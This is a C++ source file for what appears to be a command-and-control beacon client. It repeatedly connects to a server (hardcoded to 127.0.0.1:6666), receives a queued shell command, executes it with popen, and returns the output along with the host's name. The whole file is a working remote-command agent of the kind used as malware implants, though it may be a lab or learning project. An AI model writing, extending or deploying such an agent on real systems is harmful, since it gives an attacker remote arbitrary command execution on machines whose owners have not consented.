#include <cstdint>
#include <cstdio>
#include <iostream>
#include <string>
#include <cstring>
#include <mutex>
#include <queue>
#include <system_error>
#include <thread>
#include <chrono>
#include <memory>
#include <cctype>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <atomic>

using namespace std;

string clientHostname{};

int connect_to_server(const string& ip, int port)
{
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd == -1)
    {
        cout << "[client] Socket creation failed." << endl;
        return -1;
    }

    sockaddr_in clientAddr;
    clientAddr.sin_family = AF_INET;
    clientAddr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &clientAddr.sin_addr);

    socklen_t sizeClient = sizeof(clientAddr);

    int connAttempt = connect(sockfd, reinterpret_cast<sockaddr*>(&clientAddr), sizeClient);

    if (connAttempt == -1)
    {
        close(sockfd);
        return -1;
    }

    return sockfd;
}

int send_all(int fd, const string& msg)
{
    size_t bytesSent{};
    uint32_t len = htonl(msg.size());

    int sent = send(fd, &len, sizeof(len), 0);

    if (sent == -1)
    {
        cout << "[client] Problem Sending." << endl;
        return -1;
    }

    while (bytesSent < msg.size())
    {
        sent = send(fd, msg.data() + bytesSent, msg.size() - bytesSent, 0);

        if (sent == -1)
        {
            cout << "[client] Problem Sending." << endl;
            return -1;
        }

        bytesSent += sent;
    }
    
    return bytesSent;
}

string recv_all(int fd)
{
    uint32_t len{};
    int rd = read(fd, &len, 4);
    len = ntohl(len);

    if (rd == -1)
    {
        return "";
    }

    size_t bytesRead{};
    string str(len, '\0');

    while (bytesRead < len)
    {
        int reading = recv(fd, str.data()+bytesRead, len-bytesRead, 0);
        if (reading == -1)
        {
            return "";
        }
        else if (reading == 0)
        {
            cout << "[client] Session Exited." << endl;
            break;
        }
        bytesRead += reading;
    }

    return str;
}

string execute(const string& command)
{
    string output = "";

    FILE* process = popen(command.data(), "r");

    if (process == nullptr)
    {
        return "EXEC_ERROR";
    }

    char buffer[256];

    while (fgets(buffer, sizeof(buffer), process) != NULL)
    {
        output += buffer;
    }

    pclose(process);
    return output;
}

void outputing(const string& ip, int port, atomic<bool>& running)
{
    while (running)
    {
        int connfd = connect_to_server(ip, port);

        if (connfd == -1)
        {
            cout << "[client] Couldn't Connect." << endl;
            this_thread::sleep_for(chrono::seconds(5));
            continue;
        }

        cout << "[client] Checking Queue." << endl;
        string cmd = recv_all(connfd);

        if (cmd != "NOP")
        {
            cout << "[client] Executing Command: " << cmd << endl;
            string output = execute(cmd);

            if (output == "EXEC_ERROR")
            {
                send_all(connfd, "[client] Couldn't Execute Command.");
            }
            else
            {
                send_all(connfd, output);
            }
        }
        else
        {
            string beaconMsg = "[client] NOP. Beacon from [" + clientHostname + "].";
            send_all(connfd, beaconMsg);
            cout << "[client] Sent Beacon." << endl;
        }

        close(connfd);

        this_thread::sleep_for(chrono::seconds(5));
    }
}

int main()
{
    atomic<bool> running = true;

    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    clientHostname = hostname;

    string ip = "127.0.0.1";
    int port = 6666;

    thread outputThread(outputing, ref(ip), port, ref(running));

    outputThread.join(); // wait here
}